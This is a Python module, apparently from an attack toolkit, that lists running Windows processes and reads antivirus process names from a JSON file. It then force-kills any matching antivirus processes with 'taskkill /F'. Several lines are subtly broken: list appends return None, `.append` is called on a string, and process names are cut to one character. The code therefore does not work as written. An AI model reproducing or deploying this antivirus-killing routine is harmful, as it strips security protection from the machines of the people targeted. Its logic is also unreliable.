#! encoding:utf-8

from lib.system_manager import *
import os,json

def get_tasklist():
    """ 获取当前运行的所有进程 """
    now_task=[]
    for i in os.popen("tasklist").read().splitlines():
        now_task.append(i.strip(' ')[0])
    return now_task

def parse_avjson():
    """ 读取av.json内容，然后经过处理，返回所有杀软进程名的列表 """
    if get_os=='linux' or get_os=='macos':
        return False
    if get_os=='windows':
        all_av_proc=[]
        file=open('/data/av.json','r')
        content=file.read()
        content=json.loads(content)
        con_item=content.items()
        for key,value in con_item:
            #print "key---"+key
            processes=value['processes']
            #url=value['url']
            for i in processes:
                all_av_proc.append(i)
        return all_av_proc

def check_av():
    """ 将当前运行进程与杀软列表比对，匹配则返回匹配到的列表，不匹配则返回False """
    now_task=get_tasklist()
    low_now_task=[].append(i.lower().strip() for i in now_task)

    all_av_proc=parse_avjson()
    low_av_proc=[].append(i.lower().strip() for i in all_av_proc)

    av_running=''
    for av in low_av_proc:
        for tk in low_now_task:
            if av==tk:
                av_running.append(av)
            else:
                pass

    if av_running :
        return av_running
    else :
        return False

def kill_av():
    """ kill掉所有check_av()返回值中匹配到的已开启的杀软 """
    if check_av():
        for process in check_av():
            os.system('taskkill /F /IM {}'.format(process))
    elif check_av()==False:
        pass